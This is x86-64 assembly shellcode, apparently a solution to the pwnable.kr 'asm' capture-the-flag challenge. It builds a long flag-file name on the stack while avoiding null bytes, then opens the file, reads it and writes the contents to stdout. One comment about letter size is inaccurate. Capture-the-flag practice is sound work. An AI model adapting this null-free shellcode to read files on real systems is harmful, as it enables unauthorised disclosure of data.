global _start

section	.text
_start:
	xor rax,rax
	push rax        ; string terminator
	push WORD 0x676E
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x306F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x306F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6C
	push WORD 0x5F79
	push WORD 0x7265
	push WORD 0x765F
	push WORD 0x7369
	push WORD 0x5F65
	push WORD 0x6D61
	push WORD 0x6E5F
	push WORD 0x656C
	push WORD 0x6966
	push WORD 0x5F65
	push WORD 0x6874
	push WORD 0x5F79
	push WORD 0x7272
	push WORD 0x6F73
	push WORD 0x2E65
	push WORD 0x6C69
	push WORD 0x665F
	push WORD 0x7369
	push WORD 0x6874
	push WORD 0x5F64
	push WORD 0x6165
	push WORD 0x725F
	push WORD 0x6573
	push WORD 0x6165
	push WORD 0x6C70
	push WORD 0x5F65
	push WORD 0x6C69
	push WORD 0x665F
	push WORD 0x6761
	push WORD 0x6C66
	push WORD 0x5F72
	push WORD 0x6B2E
	push WORD 0x656C
	push WORD 0x6261
	push WORD 0x6E77
	push WORD 0x705F
	push WORD 0x7369
	push WORD 0x5F73
	push WORD 0x6968
	push WORD 0x7474; here the value should have been 0x74 - BUT because it adds null to the program, I used anothe 't'
	add rsp,1       ; because of the extra 't' in the begining we add 1 to rsp to get rid of it!

	xor rsi,rsi     ; flags for sys_open - 0 is read only
	xor rdx,rdx     ; open mode - 0 is read
	mov rdi,rsp     ; file name - getting it from the stack
	mov	al,2        ; system call number (sys_open)
	syscall         ; call kernel

	mov rdi,rax     ; the fd to read from (rax holds the fd after open)
	mov rsi,rsp     ; the buffer to write to - I use the stack and overwrite the file name because I don't need it anymore
	mov rdx,100     ; number of bytes to read
	mov	al,0        ; system call number (sys_read)
	syscall         ; call kernel

	mov	rsi,rsp		; message to write
	mov	rdi,1		; file descriptor (stdout)
	xor rdx, rdx
	mov	rdx,100     ; message length (double the size because each letter takes 8 bytes)
	mov	al,1		; system call number (sys_write)
	syscall		    ; call kernel
	
	xor rax,rax
	mov	al,60       ; system call number (sys_exit)
    syscall         ; call kernel


